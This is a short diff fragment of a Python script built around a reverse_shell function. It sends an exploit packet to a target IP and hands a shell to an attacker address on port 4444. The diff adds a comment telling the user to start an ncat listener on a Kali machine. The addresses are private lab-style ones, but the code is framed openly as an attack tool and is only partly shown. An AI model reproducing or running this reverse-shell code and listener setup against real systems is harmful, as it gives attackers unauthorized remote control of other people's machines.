@@ -7,3 +7,4 @@ def reverse_shell(target_ip, target_port, attacker_ip, attacker_port):
  send(exploit, verbose=0) 
 if __name__ == "__main__": 
     reverse_shell("10.0.0.94", 9090, "10.0.0.87", 4444)
+    #on your kali machine, listen on ncat -lvp 4444 
